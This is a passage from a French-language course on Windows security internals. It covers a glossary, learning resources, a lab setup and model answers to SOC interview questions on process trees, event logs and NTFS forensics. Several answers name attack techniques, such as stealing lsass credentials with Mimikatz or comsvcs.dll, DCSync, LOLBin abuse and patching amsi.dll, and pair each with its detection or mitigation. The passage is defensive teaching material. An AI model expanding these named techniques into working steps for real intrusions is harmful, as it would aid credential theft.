| Infrastructure IT | **Cours Infra** | Windows (Ch.7 Infra — vue d'ensemble OS) |
| APT | **Cours APT** | Windows (Ch.9 injection, Ch.17 persistence, Ch.20 EDR evasion) |
| Digital Forensic | **Cours Forensic** | Windows (Ch.23-24 artefacts, Ch.25 méthodologie, Ch.30 Volatility) |

---

#### Annexe G — Glossaire, ressources et lab

##### Glossaire (sélection)

| Terme | Définition |
|-------|-----------|
| **ACL / DACL / SACL** | Access Control List / Discretionary / System — permissions et audit |
| **ADS** | Alternate Data Stream — données cachées dans un flux NTFS |
| **AMSI** | Anti-Malware Scan Interface — scan du code avant exécution |
| **ASLR** | Address Space Layout Randomization — randomisation des adresses |
| **ASR** | Attack Surface Reduction — règles Defender bloquant des comportements |
| **BYOVD** | Bring Your Own Vulnerable Driver — driver légitime vulnérable pour accès kernel |
| **CFG** | Control Flow Guard — vérification des appels de fonctions indirects |
| **Credential Guard** | Isolation des credentials via VBS/hyperviseur |
| **DEP** | Data Execution Prevention — bloque l'exécution dans les pages données |
| **DPAPI** | Data Protection API — chiffrement des secrets utilisateur |
| **ETW** | Event Tracing for Windows — mécanisme de trace universel |
| **HVCI** | Hypervisor-Protected Code Integrity — intégrité du code kernel |
| **IFEO** | Image File Execution Options — hijack d'exécutable via registre |
| **LOLBin** | Living-off-the-Land Binary — binaire légitime détourné |
| **MFT** | Master File Table — index de tous les fichiers NTFS |
| **MotW** | Mark of the Web — marquage des fichiers téléchargés |
| **PE** | Portable Executable — format des binaires Windows |
| **PPL** | Protected Process Light — protection de lsass |
| **SRM** | Security Reference Monitor — vérifie les droits d'accès |
| **VBS** | Virtualization-Based Security — isolation via hyperviseur |
| **WDAC** | Windows Defender Application Control — contrôle d'exécution kernel |

##### Ressources

| Ressource | Type | Focus |
|-----------|------|-------|
| Windows Internals (Russinovich) | Livre | LA référence sur les internals Windows |
| SANS FOR500 (Windows Forensic Analysis) | Formation | Investigation forensic Windows |
| SANS FOR508 (Advanced IR & Threat Hunting) | Formation | IR avancé et threat hunting |
| 13Cubed (YouTube) | Vidéos | Forensic Windows pratique |
| Eric Zimmerman Tools | Outils | Suite complète de parsing d'artefacts |
| KAPE | Outil | Collecte + parsing automatisé |
| Velociraptor | Outil | Triage à distance à l'échelle |
| Volatility 3 | Outil | Analyse mémoire |
| CyberDefenders | Plateforme | Challenges forensic Blue Team |
| HackTheBox Sherlocks | Plateforme | Challenges forensic/IR |
| lolbas-project.github.io | Référence | Catalogue complet des LOLBins |
| SwiftOnSecurity/sysmon-config | Config | Baseline Sysmon communautaire |

##### Lab

Infrastructure minimale : 1 VM Windows 11 Pro (ou Enterprise si disponible), Sysmon installé avec config SwiftOnSecurity, outils Sysinternals (Process Explorer, Process Monitor, Autoruns, TCPView), suite Eric Zimmerman, KAPE, Volatility 3, Python 3. Optionnel : Flare VM (distribution Windows pré-configurée pour l'analyse de malwares — outils de reverse, debuggers, sandbox).

---

---

## Annexe — Questions types d'entretien et réponses types

### Questions essentielles

- **Question :** Décrivez l'arbre de processus normal de Windows et comment vous l'utilisez pour détecter des anomalies.
  - **Réponse type :** L'arbre normal suit une chaîne précise : System → smss.exe → csrss.exe + wininit.exe → services.exe → svchost.exe. En parallèle, winlogon.exe → explorer.exe → applications. Pour chaque processus critique, je vérifie quatre choses : le parent est-il le bon, le chemin d'image est-il le bon (System32), le nombre d'instances est-il normal (un seul lsass.exe), et l'utilisateur est-il attendu (services.exe sous SYSTEM). Si un de ces critères ne colle pas, c'est suspect.

- **Question :** Comment un attaquant vole-t-il les credentials sur Windows et comment s'en protéger ?
  - **Réponse type :** La cible principale c'est lsass.exe, qui contient en mémoire les hashes NTLM et les tickets Kerberos. L'outil classique c'est Mimikatz. L'attaquant peut aussi extraire la SAM et SYSTEM du registre pour récupérer les hashes locaux, ou faire un DCSync pour extraire les hashes du contrôleur de domaine. Côté protection : Credential Guard isole lsass dans un environnement virtuel, RunAsPPL protège le processus contre les injections, et LAPS évite que le même mot de passe admin local soit utilisé partout.

- **Question :** Qu'est-ce qu'un LOLBin et pourquoi c'est un problème ?
  - **Réponse type :** Un LOLBin, c'est un binaire légitime de Windows détourné par un attaquant — par exemple certutil pour télécharger un payload, rundll32 pour exécuter une DLL malveillante, ou mshta pour lancer un script distant. Le problème, c'est que ces binaires sont signés Microsoft, présents sur toutes les machines, et passent souvent sous le radar des antivirus. La détection repose sur Sysmon et les Event Logs — on cherche des command lines suspectes sur des binaires légitimes.

- **Question :** Expliquez la chaîne MotW → SmartScreen → Protected View.
  - **Réponse type :** Quand un fichier est téléchargé depuis Internet, Windows lui ajoute un Mark of the Web dans un Alternate Data Stream. Ce MotW déclenche SmartScreen qui vérifie la réputation du fichier. Si c'est un document Office, il s'ouvre en Protected View avec les macros désactivées. C'est une défense en couches — chaque étape réduit le risque. C'est pour ça que les attaquants essaient de supprimer le MotW ou d'inciter l'utilisateur à cliquer sur "Activer le contenu".

- **Question :** Quels Event Logs surveillez-vous en priorité en tant qu'analyste SOC ?
  - **Réponse type :** Les Security Logs : 4624/4625 (connexions réussies/échouées), 4672 (attribution de privilèges spéciaux), 4688 (création de processus — avec la command line si activée). Sysmon Event 1 (création de processus avec hash et parent), Event 3 (connexions réseau), Event 10 (accès à un processus — critique pour détecter le dump de lsass), Event 7 (chargement de DLL). PowerShell 4104 (Script Block Logging). Et Event 7045 (création de service — PsExec par exemple).

### Questions complémentaires

- **Question :** Qu'est-ce que NTFS apporte comme artefacts forensic ?
  - **Réponse type :** La MFT (Master File Table) contient un enregistrement pour chaque fichier, même supprimé récemment — c'est un artefact majeur. Les timestamps MACB existent en double : dans $STANDARD_INFORMATION (modifiable par l'utilisateur) et $FILE_NAME (modifiable uniquement par le kernel). Si les deux divergent, c'est du timestomping — un signe de manipulation. Le $UsnJrnl enregistre toutes les modifications de fichiers et aide à reconstruire la timeline.

- **Question :** C'est quoi AMSI et comment les attaquants le contournent ?
  - **Réponse type :** AMSI est l'interface qui permet à PowerShell, VBA et d'autres moteurs de script de soumettre le code à l'antivirus avant exécution. Les attaquants le contournent en patchant amsi.dll en mémoire pour que le scan retourne toujours "propre". Mais le bypass lui-même est souvent détecté par le Script Block Logging (Event 4104), car le code du bypass est enregistré avant qu'il ne prenne effet.

- **Question :** C'est quoi le User mode vs Kernel mode ?
  - **Réponse type :** User mode (Ring 3), c'est là où tournent les applications — elles ont un accès limité et ne peuvent pas accéder directement au matériel. Kernel mode (Ring 0), c'est le noyau, les drivers — accès total à la mémoire et au matériel. Un crash en user mode ne plante que l'application, un crash en kernel mode provoque un écran bleu. Cette séparation est la base de la sécurité : pour accéder au kernel, il faut passer par des syscalls contrôlés.

### Questions les plus probables en entretien

1. Arbre de processus normal Windows ?
2. Comment les credentials sont volés et comment s'en protéger ?
3. LOLBins : c'est quoi, exemples, détection ?
4. Chaîne MotW → SmartScreen → Protected View ?
5. Event Logs prioritaires pour un SOC ?
6. User mode vs Kernel mode ?

### Réponses flash

- **Arbre processus** → System → smss → csrss + wininit → services → svchost. Winlogon → explorer → apps. Vérifier : parent, chemin, instances, user.
- **Credentials** → Cible = lsass.exe (Mimikatz). Protection = Credential Guard, RunAsPPL, LAPS.
- **LOLBins** → Binaires légitimes détournés (certutil, rundll32, mshta). Signés MS, passent les AV. Détection = Sysmon + command line.
- **MotW** → Fichier téléchargé → ADS Zone.Identifier → SmartScreen → Protected View → macros bloquées.
- **Event Logs SOC** → 4624/4625 (logon), 4672 (privs), 4688 (process), Sysmon 1/3/10, PowerShell 4104, 7045 (service).
- **User/Kernel mode** → Ring 3 (applis, limité) vs Ring 0 (noyau, drivers, accès total). Séparation = base de la sécurité.
- **NTFS forensic** → MFT (tous les fichiers), timestamps $SI vs $FN (détecte timestomping), $UsnJrnl (journal modifs).

---

> **Note de clôture**
>
> Ce cours a été conçu pour enseigner comment Windows fonctionne sous le capot avec un prisme sécurité permanent — chaque concept est relié à son exploitation ou sa défense.
>
> L'opération SHADOW illustre une réalité que tout analyste SOC et IR constate : les attaques modernes n'utilisent pas de malware exotique — elles utilisent les mécanismes légitimes de Windows. Une macro Word, un LOLBin (certutil + rundll32), du Process Hollowing dans svchost.exe, un dump lsass via comsvcs.dll, du mouvement latéral via WMI et PsExec, et un DCSync. Chaque technique est un mécanisme Windows détourné. C'est pourquoi comprendre les internals est le prérequis pour détecter : si on ne sait pas à quoi ressemble un svchost.exe normal, on ne peut pas identifier le faux.
>
> Le cours assume une conviction : la défense en profondeur fonctionne quand chaque couche est comprise. Le MotW déclenche SmartScreen qui déclenche Protected View qui bloque les macros. AMSI scanne le code avant exécution. ETW alimente les Event Logs, Sysmon, et l'EDR. Credential Guard isole les secrets. HVCI protège le kernel. Chaque couche est contournable individuellement — mais les empiler force l'attaquant à dépenser plus de temps, générer plus de signaux, et prendre plus de risques d'être détecté. La victoire de la défense est dans la profondeur.
>
> *Comprendre les internals • Détecter l'anormal • Investiguer les artefacts • Durcir les configurations — parce que la sécurité Windows commence par la compréhension de Windows.*
